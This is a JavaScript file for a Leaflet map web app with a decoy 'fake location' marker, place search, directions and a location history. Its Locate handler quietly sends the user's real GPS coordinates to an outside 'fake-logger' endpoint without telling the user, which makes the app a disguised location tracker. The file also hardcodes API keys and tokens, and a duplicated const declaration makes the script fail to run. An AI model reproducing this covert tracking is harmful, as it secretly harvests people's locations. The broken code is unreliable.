// Replace with your MapTiler key
const MAPTILER_KEY = "TCvevZOKio37CwdIPP3u";


// Initial map center at fake location (Qatar)
const map = L.map('map').setView([25.276987, 51.520008], 13);

// Map layer
L.tileLayer(`https://api.maptiler.com/maps/streets/{z}/{x}/{y}.png?key=${MAPTILER_KEY}`, {
  attribution: '&copy; MapTiler & OpenStreetMap',
  tileSize: 512,
  zoomOffset: -1
}).addTo(map);

// Custom Icons
const fakeMarkerIcon = L.icon({ iconUrl: 'assets/dark-mode.png', iconSize: [32, 32] });
const fakeMarkerIcon = L.icon({ iconUrl: 'assets/fake-marker.png', iconSize: [32, 32] });
const customStartIcon = L.icon({ iconUrl: 'assets/start-icon.png', iconSize: [32, 32] });
const googleRedIcon = L.icon({ iconUrl: 'assets/red-marker.png', iconSize: [32, 32] });
const currentLocationIcon = L.icon({ iconUrl: 'assets/current-location.png', iconSize: [32, 32] });

// Add fake location marker
let fakeMarker = L.marker([25.276987, 51.520008], { icon: fakeMarkerIcon }).addTo(map);

// Remove fake marker on double click
map.on('dblclick', () => map.removeLayer(fakeMarker));

// Location history
let locationHistory = [];

function addHistory(entry) {
  locationHistory.push(entry);
  const item = document.createElement('li');
  item.textContent = entry;
  document.getElementById('historyList').appendChild(item);
}

// Dark Mode
document.getElementById('darkModeBtn').addEventListener('click', () => {
  document.body.classList.toggle('dark-mode');
});

// Show/hide history
document.getElementById('historyToggleBtn').addEventListener('click', () => {
  const panel = document.getElementById('history-panel');
  panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
});

// Show/hide direction panel, toggle search box
document.getElementById('directionToggleBtn').addEventListener('click', () => {
  const dir = document.getElementById('direction-panel');
  const search = document.querySelector('.floating-search');
  dir.style.display = 'block';
  search.style.display = 'none';
});

document.getElementById('closeDirectionBtn').addEventListener('click', () => {
  document.getElementById('direction-panel').style.display = 'none';
  document.querySelector('.floating-search').style.display = 'flex';
});

// Search Place
document.getElementById('searchBtn').addEventListener('click', () => {
  const place = document.getElementById('searchInput').value;
  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${place}`)
    .then(res => res.json())
    .then(data => {
      if (data && data.length > 0) {
        const lat = data[0].lat, lon = data[0].lon;
        map.setView([lat, lon], 15);
        L.marker([lat, lon], { icon: googleRedIcon }).addTo(map);
        addHistory(`Searched: ${place}`);
      }
    });
});

// Autocomplete for Search
document.getElementById('searchInput').addEventListener('input', function () {
  const query = this.value;
  const container = document.getElementById('searchSuggestions');
  container.innerHTML = '';
  if (query.length < 2) return;

  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${query}`)
    .then(res => res.json())
    .then(data => {
      data.slice(0, 5).forEach(place => {
        const div = document.createElement('div');
        div.className = 'suggestion';
        div.textContent = place.display_name;
        div.addEventListener('click', () => {
          document.getElementById('searchInput').value = place.display_name;
          container.innerHTML = '';
        });
        container.appendChild(div);
      });
    });
});

// Directions
let control;
document.getElementById('directionBtn').addEventListener('click', () => {
  const from = document.getElementById('fromInput').value;
  const to = document.getElementById('toInput').value;
  if (control) map.removeControl(control);

  control = L.Routing.control({
    waypoints: [],
    router: L.Routing.mapbox('pk.eyJ1IjoibWFwdGlsZXIiLCJhIjoiY2t1OXlhbDFvMGc0dTJvcGQ5NmR3eHZybyJ9.d1m4w4O0qln07trDQUuKAw'),
    createMarker: (i, wp) => {
      return L.marker(wp.latLng, {
        icon: i === 0 ? customStartIcon : googleRedIcon
      });
    }
  }).addTo(map);

  Promise.all([
    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${from}`).then(res => res.json()),
    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${to}`).then(res => res.json())
  ]).then(([fromData, toData]) => {
    if (fromData.length && toData.length) {
      const fromLatLng = L.latLng(fromData[0].lat, fromData[0].lon);
      const toLatLng = L.latLng(toData[0].lat, toData[0].lon);
      control.setWaypoints([fromLatLng, toLatLng]);
      addHistory(`Direction: ${from} → ${to}`);
    }
  });
});

// Autocomplete for Directions
['fromInput', 'toInput'].forEach(id => {
  const input = document.getElementById(id);
  const suggestionBox = document.getElementById(`${id}Suggestions`);

  input.addEventListener('input', () => {
    const query = input.value;
    suggestionBox.innerHTML = '';
    if (query.length < 2) return;

    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${query}`)
      .then(res => res.json())
      .then(data => {
        data.slice(0, 5).forEach(place => {
          const div = document.createElement('div');
          div.className = 'suggestion';
          div.textContent = place.display_name;
          div.addEventListener('click', () => {
            input.value = place.display_name;
            suggestionBox.innerHTML = '';
          });
          suggestionBox.appendChild(div);
        });
      });
  });
});

// 🌍 Locate User
document.getElementById('locateBtn').addEventListener('click', () => {
  navigator.geolocation.getCurrentPosition(pos => {
    const lat = pos.coords.latitude, lon = pos.coords.longitude;
    map.setView([lat, lon], 15);
    L.marker([lat, lon], { icon: currentLocationIcon }).addTo(map);
    addHistory(`Current Location: ${lat.toFixed(4)}, ${lon.toFixed(4)}`);

    // 🧠 Send to backend
    fetch('https://fake-logger.onrender.com/logger.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        lat: lat,
        lon: lon,
        source: 'leaflet',
        gps: true
      })
    });
  });
});
